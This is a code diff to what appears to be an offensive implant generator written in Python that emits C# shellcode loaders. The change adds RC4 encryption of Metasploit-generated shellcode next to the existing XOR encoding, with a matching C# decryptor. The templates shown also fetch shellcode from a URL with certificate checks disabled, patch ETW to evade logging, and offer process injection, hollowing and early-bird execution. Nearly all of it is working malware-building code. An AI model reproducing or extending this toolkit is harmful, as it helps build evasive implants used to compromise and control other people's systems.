@@ -1,9 +1,13 @@
 import base64
+import netifaces as ni
 import os
 import subprocess
-import netifaces as ni
-from libpinvoke import PINVOKE
+import sys
 import yaml
+sys.path.append('./pylib')
+import rc4_encrypt
+
+from pylib.libpinvoke import PINVOKE
 
 # References:
 # https://github.com/plackyhacker/Shellcode-Injection-Techniques
@@ -127,24 +131,82 @@ URL_DL_CODE = """
 	ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
 	System.Net.WebClient client = new System.Net.WebClient();
 	byte[] shellcode = client.DownloadData(url);
-
 """
 
 # Hardcoded (stageless) shellcode
 SC_HARDCODED = """
-   byte[] shellcode = new byte[] {{ {xor_shellcode} }};
+   byte[] shellcode = new byte[] {{ {enc_shellcode} }};
 """
 
-# Decoder FOR XOR'd shellcode
+# Decoder for XOR'd shellcode
 SC_XOR_DECODER = """
   for (int i = 0; i < shellcode.Length; i++)
   {{
-    shellcode[i] = (byte)(((uint)shellcode[i] ^ {xor_key}) & 0xFF);
+    shellcode[i] = (byte)(((uint)shellcode[i] ^ {enc_key}) & 0xFF);
   }}
+"""
+
+# Decoder for RC4 shellcode
+SC_RC4_DECODER = """
+    byte[] key = System.Text.Encoding.ASCII.GetBytes("{enc_key}");
+    RC4 rc4 = new RC4(key);
+    rc4.DecryptInPlace(shellcode);
 """
 
 ETW_PATCH = "PatchEtw(getETWPayload());"
 
+RC4_DECRYPT_IMPORT = """
+public class RC4
+{
+    private byte[] S;
+    private byte[] T;
+
+    public RC4(byte[] key)
+    {
+        Initialize(key);
+    }
+
+    private void Initialize(byte[] key)
+    {
+        S = new byte[256];
+        T = new byte[256];
+
+        for (int i = 0; i < 256; i++)
+        {
+            S[i] = (byte)i;
+            T[i] = key[i % key.Length];
+        }
+
+        int j = 0;
+        for (int i = 0; i < 256; i++)
+        {
+            j = (j + S[i] + T[i]) % 256;
+            Swap(S, i, j);
+        }
+    }
+
+    private void Swap(byte[] array, int i, int j)
+    {
+        byte temp = array[i];
+        array[i] = array[j];
+        array[j] = temp;
+    }
+
+    public void DecryptInPlace(byte[] ciphertext)
+    {
+        int i = 0, j = 0;
+
+        for (int k = 0; k < ciphertext.Length; k++)
+        {
+            i = (i + 1) % 256;
+            j = (j + S[i]) % 256;
+            Swap(S, i, j);
+            int t = (S[i] + S[j]) % 256;
+            ciphertext[k] = (byte)(ciphertext[k] ^ S[t]);
+        }
+    }
+}
+"""
 
 START_PROCESS_INJECT_IMPORT = f"""
     {PINVOKE["VirtualAllocEx"]} 
@@ -511,7 +573,7 @@ main_choices = {
     {ak.START_PROCESS_HOLLOW_CODE}""",
   'interprocess':"{ak.START_PROCESS_INTERPROCESS_CODE}",
   'earlybird':"{ak.START_PROCESS_EARLYBIRD_CODE}",
-  'standard':"{ak.START_SHELLCODE}"
+  'standard':"{ak.START_SHELLCODE}",
 }
 
 
@@ -542,18 +604,33 @@ class Obfuscator:
   def get_key_csharp(self):
     return "".join("0x%02x" % b for b in self.key)
 
+  def get_key_ascii(self):
+    return self.key.decode("utf-8")
+
 
 class ShellCode(Obfuscator):
-  def __init__(self, msf_cmd, xor_key=b'\00', caesar_key=0):
+  def __init__(self, msf_cmd, xor_key=b'\00', caesar_key=0, rc4_key=None):
+    """
+    raw is the unencrypted shellcode
+    key is the key used to encrypt/encode the shellcode
+    encoded is the encrypted/encoded shellcode
+    """
+
+    # Generate shellcode with MSF
     self.raw = subprocess.check_output(msf_cmd, shell=True)
-    self.key = xor_key
-    self.encoded = [ a ^ b for (a,b) in zip(self.raw, self.key*len(self.raw)) ]
+
+    # Set key
+    if rc4_key is not None:
+      self.key = rc4_key
+      self.encoded = rc4_encrypt.encrypt(plaintext=self.raw, key=self.key)
+    else:
+      self.key = xor_key
+      self.encoded = [ a ^ b for (a,b) in zip(self.raw, self.key*len(self.raw)) ]
 
 class Implant:
   def __init__(self, template, base_name):
     self.template = template
     self.base_name = base_name
-
 
   def compile(self):
     pass
